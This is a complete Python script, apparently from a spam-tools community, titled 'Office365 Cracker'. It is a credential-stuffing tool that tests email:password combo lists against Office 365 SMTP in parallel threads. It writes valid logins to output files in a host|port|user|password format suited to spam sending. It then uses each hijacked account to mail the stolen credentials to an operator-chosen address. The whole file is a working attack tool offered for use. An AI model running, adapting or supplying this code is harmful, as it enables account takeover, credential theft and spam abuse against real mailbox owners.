import smtplib
from smtplib import SMTPAuthenticationError, SMTPDataError
import threading
import time
from colorama import Fore
import os

# Constants for output file names
VALID_OUTPUT_FILE = 'valid-office365.txt'
SMTP_OUTPUT_FILE = 'SMTP-office365.txt'
BLACKLIST_FILE = 'BlackList.txt'

# Clear console
os.system('cls')

def validate_credentials(combo, mail_to_send):
    """Validate email credentials against the SMTP server."""
    username, password = map(str.strip, combo.split(':'))
    try:
        with smtplib.SMTP('smtp.office365.com', 587) as server:
            server.ehlo()
            server.starttls()
            server.login(username, password)
            print(Fore.GREEN + 'Valid Login - ' + combo)

            # Save valid credentials to output files
            with open(VALID_OUTPUT_FILE, 'a') as valid_file:
                valid_file.write(combo + '\n')
            
            smtp_format = f"smtp.office365.com|587|{username}|{password}"
            with open(SMTP_OUTPUT_FILE, 'a') as smtp_file:
                smtp_file.write(smtp_format + '\n')

            # Send a test email
            message = f"Subject: {combo}\n\n{combo}"
            server.sendmail(username, mail_to_send, message)

    except SMTPAuthenticationError:
        print(Fore.RED + 'Invalid Login - ' + combo)
    except SMTPDataError:
        print(Fore.RED + 'Data Error - ' + combo)
    except Exception as e:
        print(Fore.RED + f'Failed - {combo} (Error: {e})')

def check_blacklist(combo, mail_to_send):
    """Check if the domain is blacklisted before validating."""
    try:
        with open(BLACKLIST_FILE, 'r') as blacklist_file:
            blacklist = blacklist_file.read().splitlines()
        domain = combo.split(':')[0].split('@')[1].strip()
        if domain in blacklist:
            print(Fore.YELLOW + 'Blacklisted - ' + combo)
        else:
            validate_credentials(combo, mail_to_send)
    except FileNotFoundError:
        print(Fore.RED + f"Blacklist file '{BLACKLIST_FILE}' not found. Proceeding without blacklist check.")
        validate_credentials(combo, mail_to_send)

def main():
    """Main function to execute the script."""
    os.system('cls')
    banner = (
        "\n\n    ____  ____  _   ____  ____________ ____________\n"
        "   / __ \\/ __ \\/ | / / / / / ___/ ___// ____/ ____/\n"
        "  / / / / / / /  |/ / / / /\\__ \\__ \\/ __/ / /_    \n"
        " / /_/ / /_/ / /|  / /_/ /___/ /__/ / /___/ __/    \n"
        "/_____/\\____/_/ |_/\\____//____/____/_____/_/       \n"
        "                                               \n"
    )
    print(Fore.LIGHTGREEN_EX + banner + 
          "\n             Office365 Cracker\n"
          "             Community  https://t.me/freespamtools2\n"
          "              Coded By @donussef\n"
    )
    # Get user input
    combo_file = input(Fore.RED + '[+] ComboList: ')
    thread_limit = int(input(Fore.LIGHTGREEN_EX + '[+] Threads: '))
    mail_to_send = input(Fore.LIGHTBLUE_EX + '[+] Result Mail: ')

    # Load combos
    try:
        with open(combo_file, 'r', encoding='utf-8', errors='ignore') as file:
            combos = file.readlines()
    except FileNotFoundError:
        print(Fore.RED + f"File '{combo_file}' not found. Exiting...")
        return

    # Process combos with threading
    threads = []
    for combo in combos:
        combo = combo.strip()
        while threading.active_count() > thread_limit:
            time.sleep(0.1)
        
        thread = threading.Thread(target=check_blacklist, args=(combo, mail_to_send))
        threads.append(thread)
        thread.start()

    # Wait for all threads to complete
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
